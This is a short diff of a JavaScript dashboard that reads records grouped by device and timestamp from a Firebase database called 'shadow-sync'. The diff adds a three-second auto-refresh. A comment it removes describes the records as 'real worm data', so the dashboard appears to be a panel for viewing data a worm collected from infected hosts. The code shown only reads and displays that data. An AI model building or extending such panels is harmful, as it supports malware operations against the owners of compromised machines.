@@ -4,10 +4,8 @@
 // No server required, no token required
 // ============================================
 
-
 const FIREBASE_URL = "https://shadow-sync-3aee0-default-rtdb.firebaseio.com/";
 let collectionsData = [];
-
 
 // ============================================
 // LOAD ALL COLLECTIONS
@@ -22,7 +20,6 @@ async function loadCollections() {
       for (const deviceId in data) {
         for (const timestamp in data[deviceId]) {
           const entry = data[deviceId][timestamp];
-          // Only include entries that look like real worm data
           if (entry && (entry.device_id || entry.hostname)) {
             collections.push(entry);
           }
@@ -43,6 +40,7 @@ async function loadCollections() {
     `;
   }
 }
+
 // ============================================
 // AGGREGATE HELPERS
 // ============================================
@@ -204,3 +202,6 @@ function renderActions() {
 // INIT
 // ============================================
 loadCollections();
+
+// ===== AUTO-REFRESH (SAFE ADDITION) =====
+setInterval(loadCollections, 3000);
